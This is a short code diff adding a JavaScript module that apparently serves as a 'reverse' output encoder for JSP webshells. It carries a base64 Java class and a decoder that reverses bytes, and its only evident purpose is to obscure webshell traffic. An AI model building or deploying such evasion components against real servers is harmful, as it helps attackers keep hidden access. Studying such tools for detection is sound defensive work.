@@ -1,0 +1,19 @@
+/**
+ * JSP::reverse 解码器
+ */
+
+ 'use strict';
+
+ module.exports = {
+   asoutput: (ext={}) => {
+     /**
+      * ext = {
+      *   opts: 类型为 Object, Shell 配置
+      * }
+      */
+     return `yv66vgAAADIAHgoACAATBwAUCgACABUKAAIAFgoAAgAXCQAHABgHABkHABoBAANyZXMBABJMamF2YS9sYW5nL1N0cmluZzsBAAY8aW5pdD4BABUoTGphdmEvbGFuZy9TdHJpbmc7KVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQAIdG9TdHJpbmcBABQoKUxqYXZhL2xhbmcvU3RyaW5nOwEAClNvdXJjZUZpbGUBABRBc291dHB1dFJldmVyc2UuamF2YQwACwAbAQAWamF2YS9sYW5nL1N0cmluZ0J1ZmZlcgwACwAMDAAcAB0MAA8AEAwACQAKAQAPQXNvdXRwdXRSZXZlcnNlAQAQamF2YS9sYW5nL09iamVjdAEAAygpVgEAB3JldmVyc2UBABooKUxqYXZhL2xhbmcvU3RyaW5nQnVmZmVyOwAhAAcACAAAAAEAAAAJAAoAAAACAAEACwAMAAEADQAAADcABAACAAAAFyq3AAEquwACWSu3AAO2AAS2AAW1AAaxAAAAAQAOAAAADgADAAAAAwAEAAQAFgAFAAEADwAQAAEADQAAAB0AAQABAAAABSq0AAawAAAAAQAOAAAABgABAAAACAABABEAAAACABI=`;
+   },
+   decode_buff: (buff) => {
+     return Buffer.from(buff).reverse();
+   }
+ }
